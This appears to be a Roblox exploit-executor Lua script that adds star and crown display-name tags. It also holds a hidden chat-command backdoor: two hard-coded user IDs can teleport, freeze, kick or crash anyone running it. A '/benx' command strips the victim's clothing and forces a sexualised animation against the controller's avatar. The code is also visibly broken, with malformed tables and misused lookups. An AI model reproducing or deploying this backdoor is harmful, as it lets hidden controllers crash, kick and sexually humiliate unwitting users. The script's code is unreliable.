-- Star

local Premium = {
    [] = true,
}

game.RunService.Stepped:Connect(function()
    function Star()
        for i,v in pairs(game.Players:GetChildren()) do
            if Premium[v.UserId] then
                if v.Character then
                    if v.Character.Parent.Name == 'Players' then
                        v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
                    end
                end
            end
        end
    end
    local xdd = pcall(Star)
end)

-- Crown

local Mods = {
    [623017592] -- FROSTED
    [428628880] -- RIDE
}

game.RunService.Stepped:Connect(function()
    function Crown()
        for i,v in pairs(game.Players:GetChildren()) do
            if Mods[v.UserId] then
                if v.Character then
                    if v.Character.Parent.Name == 'Players' then
                        v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
                    end
                end
            end
        end
    end
    local xdd = pcall(Crown)
end)

-- Mod Perms


local player = game.Players.LocalPlayer
local isamod = false
local prefix = "/"
local bending = false
local mods = {
    [623017592] -- FROSTED
    [428628880] -- RIDE
}

if table.find(mods,player.UserId) then
	isamod = true
    CoreGui:SetCore("SendNotification", {
        Title = "Premium";
        Text = "Thank you for buying premium, enjoy!";
        Duration = 10;
        Button1 = "Your welcome";
    })
end

local function cmds(msg,plr)
	if isamod == false or table.find(mods,plr) then
		Mod = game.Players:GetPlayerByUserId(plr)
		isamod = table.find(mods,player.UserId)
		if msg == "/bring ." then
			if not isamod then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Mod.Character.HumanoidRootPart.CFrame
			end
		end

        if msg == "/crash ." then
            setfpscap(0)
        end

        if msg == "/freeze ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			end
		end

        if msg == "/unfreeze ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		end

        if msg == "/kick ." then
			if not isamod then
                game.Players.LocalPlayer:Kick("You have been kicked by " .. Mod.Name .. ".")
			end
		end

        if msg == "/benx ." then
			if not isamod then
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game:GetService('Players'):FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                end;
                Start()    
                repeat wait() until bending == false
                Pause()
			end
		end

        if msg == "/unbenx ." then
			if not isamod then
                repeat 
                    task.wait()
                    bending = false
                until not bending
			end
		end
    end
end

for i,v in pairs(game:GetService('Players'):GetChildren()) do
	if table.find(mods,v.UserId) then
		v.Chatted:Connect(function(msg)
			cmds(msg,v.UserId)
		end)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(mods,plr.UserId) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)
